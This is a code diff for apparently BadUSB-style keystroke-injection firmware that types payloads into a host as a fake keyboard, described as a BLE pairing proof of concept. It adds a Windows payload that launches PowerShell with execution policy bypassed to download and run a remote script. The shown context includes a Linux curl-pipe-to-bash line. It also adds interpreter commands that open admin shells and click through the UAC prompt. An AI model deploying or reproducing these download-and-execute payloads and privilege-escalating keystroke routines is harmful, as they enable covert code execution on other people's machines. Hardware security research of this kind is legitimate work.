@@ -104,15 +104,12 @@ DELAY 1500
 STRING nohup bash -c 'curl -sL whitewhidow.github.io/hid-ble-poc/pair.sh | bash -s {MAC}' >/dev/null 2>&1 & disown; exit
 ENTER
 )";
-static const char DEF_WINDOWS[] = R"(# Windows (placeholder): Run -> PowerShell + a note. No real BLE helper yet.
+static const char DEF_WINDOWS[] = R"PAY(# Windows 11: fetch + run the PairTool Just-Works pairing helper (pair_win.ps1).
 GUI r
-DELAY 600
-STRING powershell
+DELAY 800
+STRING powershell -NoExit -ExecutionPolicy Bypass -Command "& ([scriptblock]::Create((iwr -useb https://whitewhidow.github.io/hid-ble-poc/pair_win.ps1).Content)) -MAC '{MAC}'"
 ENTER
-DELAY 1500
-STRING # PoC-KBD ({MAC}) - Windows BLE pairing bootstrap not implemented yet
-ENTER
-)";
+)PAY";
 static const char DEF_MACOS[] = R"(# macOS (placeholder): Spotlight -> Terminal + a note. No real BLE helper yet.
 GUI SPACE
 DELAY 600
@@ -129,7 +126,34 @@ static const char* osPath(int os) {
     switch (os) { case POC_OS_WINDOWS: return "/windows.txt"; case POC_OS_MACOS: return "/macos.txt"; default: return "/linux.txt"; }
 }
 
-// Tiny interpreter over a payload string: GUI [key] | CTRLALT <key> | STRING <text> | ENTER | DELAY <ms> | # comment
+// key-name -> Arduino keycode (for Press/PressRelease). Single chars pass through.
+static uint8_t usbKeyByName(const String& n) {
+    struct { const char* n; uint8_t k; } T[] = {
+        {"KEY_LEFT_CTRL",KEY_LEFT_CTRL},{"KEY_LEFT_SHIFT",KEY_LEFT_SHIFT},{"KEY_LEFT_ALT",KEY_LEFT_ALT},{"KEY_LEFT_GUI",KEY_LEFT_GUI},
+        {"KEY_RIGHT_CTRL",KEY_RIGHT_CTRL},{"KEY_RIGHT_SHIFT",KEY_RIGHT_SHIFT},{"KEY_RIGHT_ALT",KEY_RIGHT_ALT},{"KEY_RIGHT_GUI",KEY_RIGHT_GUI},
+        {"KEY_ENTER",KEY_RETURN},{"KEY_RETURN",KEY_RETURN},{"KEY_ESC",KEY_ESC},{"KEY_BACKSPACE",KEY_BACKSPACE},{"KEY_TAB",KEY_TAB},
+        {"KEY_UP_ARROW",KEY_UP_ARROW},{"KEY_DOWN_ARROW",KEY_DOWN_ARROW},{"KEY_LEFT_ARROW",KEY_LEFT_ARROW},{"KEY_RIGHT_ARROW",KEY_RIGHT_ARROW},
+        {"KEY_INSERT",KEY_INSERT},{"KEY_DELETE",KEY_DELETE},{"KEY_PAGE_UP",KEY_PAGE_UP},{"KEY_PAGE_DOWN",KEY_PAGE_DOWN},
+        {"KEY_HOME",KEY_HOME},{"KEY_END",KEY_END},{"KEY_CAPS_LOCK",KEY_CAPS_LOCK},{"KEY_NUM_LOCK",KEY_NUM_LOCK},{"KEY_SCROLL_LOCK",KEY_SCROLL_LOCK},
+        {"KEY_F1",KEY_F1},{"KEY_F2",KEY_F2},{"KEY_F3",KEY_F3},{"KEY_F4",KEY_F4},{"KEY_F5",KEY_F5},{"KEY_F6",KEY_F6},
+        {"KEY_F7",KEY_F7},{"KEY_F8",KEY_F8},{"KEY_F9",KEY_F9},{"KEY_F10",KEY_F10},{"KEY_F11",KEY_F11},{"KEY_F12",KEY_F12},
+    };
+    for (auto& e : T) if (n == e.n) return e.k;
+    if (n.length() == 1) return (uint8_t)n[0];
+    return 0;
+}
+// press modifier(s) + key/char together, hold, release
+static void usbCombo(uint8_t m1, uint8_t m2, uint8_t key, char ch) {
+    if (m1) Keyboard.press(m1);
+    if (m2) Keyboard.press(m2);
+    if (key) Keyboard.press(key); else if (ch) Keyboard.press(ch);
+    delay(100); Keyboard.releaseAll();
+}
+static String subMac(const String& s) { String r = s; r.replace("{MAC}", bleHidMac()); return r; }
+
+// Interpreter over a payload string. Supports our GUI/STRING/ENTER/DELAY/CTRLALT
+// AND the Evil Crow Cable "Wind" command set (Print/PrintLine/Press/PressRelease/
+// Release/Gui*/RunWin/RunNix/RunMac/RunLauncher/RunCmdAdmin/RunPowershellAdmin).
 static void usbRunPayloadContent(const String& content) {
     int start = 0, n = content.length();
     while (start < n) {
@@ -137,17 +161,35 @@ static void usbRunPayloadContent(const String& content) {
         String line = (nl < 0) ? content.substring(start) : content.substring(start, nl);
         start = (nl < 0) ? n : nl + 1;
         line.trim();
-        if (line.length() == 0 || line[0] == '#') continue;
+        if (line.length() == 0 || line[0] == '#' || line.startsWith("REM")) continue;
+        // our original verbs
         if (line == "ENTER") Keyboard.write((uint8_t)'\n');
-        else if (line.startsWith("DELAY ")) delay(line.substring(6).toInt());
-        else if (line.startsWith("STRING ")) { String s = line.substring(7); s.replace("{MAC}", bleHidMac()); usbHidType(s.c_str()); }
+        else if (line.startsWith("DELAY ") || line.startsWith("Delay ")) delay(line.substring(6).toInt());
+        else if (line.startsWith("STRING ")) usbHidType(subMac(line.substring(7)).c_str());
         else if (line == "GUI") tapGui("");
         else if (line.startsWith("GUI ")) { String a = line.substring(4); a.trim(); tapGui(a); }
-        else if (line.startsWith("CTRLALT ")) {   // Ctrl+Alt+<key>, e.g. CTRLALT t (open terminal)
-            char k = line.charAt(8);
-            Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press(k);
-            delay(90); Keyboard.releaseAll();
-        }
+        else if (line.startsWith("CTRLALT ")) usbCombo(KEY_LEFT_CTRL, KEY_LEFT_ALT, 0, line.charAt(8));
+        // Evil Crow "Wind"
+        else if (line.startsWith("PrintLine "))  Keyboard.println(subMac(line.substring(10)).c_str());
+        else if (line.startsWith("Print "))      Keyboard.print(subMac(line.substring(6)).c_str());
+        else if (line.startsWith("WinPrintLine "))Keyboard.println(subMac(line.substring(13)).c_str());
+        else if (line.startsWith("WinPrint "))   Keyboard.print(subMac(line.substring(9)).c_str());
+        else if (line == "Gui")       usbCombo(KEY_LEFT_GUI, 0, 0, 0);
+        else if (line == "GuiR")      usbCombo(KEY_LEFT_GUI, 0, 0, 'r');
+        else if (line == "GuiSpace")  usbCombo(KEY_LEFT_GUI, 0, 0, ' ');
+        else if (line == "AltF2")     usbCombo(KEY_LEFT_ALT, 0, KEY_F2, 0);
+        else if (line == "CtrlAltT")  usbCombo(KEY_LEFT_CTRL, KEY_LEFT_ALT, 0, 't');
+        else if (line.startsWith("PressRelease ")) { uint8_t k = usbKeyByName(line.substring(13)); if (k) { Keyboard.press(k); delay(100); Keyboard.releaseAll(); } }
+        else if (line.startsWith("Press "))        { uint8_t k = usbKeyByName(line.substring(6));  if (k) Keyboard.press(k); }
+        else if (line.startsWith("Release"))       Keyboard.releaseAll();
+        else if (line.startsWith("RunWin "))      { usbCombo(KEY_LEFT_GUI, 0, 0, 'r');            delay(2000); Keyboard.println(subMac(line.substring(7)).c_str()); }
+        else if (line.startsWith("RunNix "))      { usbCombo(KEY_LEFT_CTRL, KEY_LEFT_ALT, 0, 't'); delay(2000); Keyboard.println(subMac(line.substring(7)).c_str()); }
+        else if (line.startsWith("RunMac "))      { usbCombo(KEY_LEFT_GUI, 0, 0, ' ');            delay(2000); Keyboard.println(subMac(line.substring(7)).c_str()); }
+        else if (line.startsWith("RunLauncher ")) { usbCombo(KEY_LEFT_ALT, 0, KEY_F2, 0);         delay(2000); Keyboard.println(subMac(line.substring(12)).c_str()); }
+        else if (line.startsWith("RunPowershellAdmin")) { usbCombo(KEY_LEFT_GUI, 0, 0, 'x'); delay(2000); Keyboard.print("a"); delay(3000); Keyboard.press(KEY_LEFT_ARROW); delay(100); Keyboard.releaseAll(); delay(100); Keyboard.press(KEY_RETURN); delay(100); Keyboard.releaseAll(); }
+        else if (line.startsWith("RunCmdAdmin"))  { usbCombo(KEY_LEFT_GUI, 0, 0, 'r'); delay(2000); Keyboard.print("cmd"); delay(2000); Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_SHIFT); Keyboard.press(KEY_RETURN); delay(100); Keyboard.releaseAll(); delay(2000); Keyboard.press(KEY_LEFT_ARROW); delay(100); Keyboard.releaseAll(); delay(100); Keyboard.press(KEY_RETURN); delay(100); Keyboard.releaseAll(); }
+        else if (line == "DetectOS" || line.startsWith("ShellWin") || line.startsWith("ShellNix") || line.startsWith("ShellMac") || line.startsWith("ServerConnect")) { /* network/LED — not on this path */ }
+        else usbHidType(subMac(line).c_str());   // fallback: type the line literally
     }
 }
 
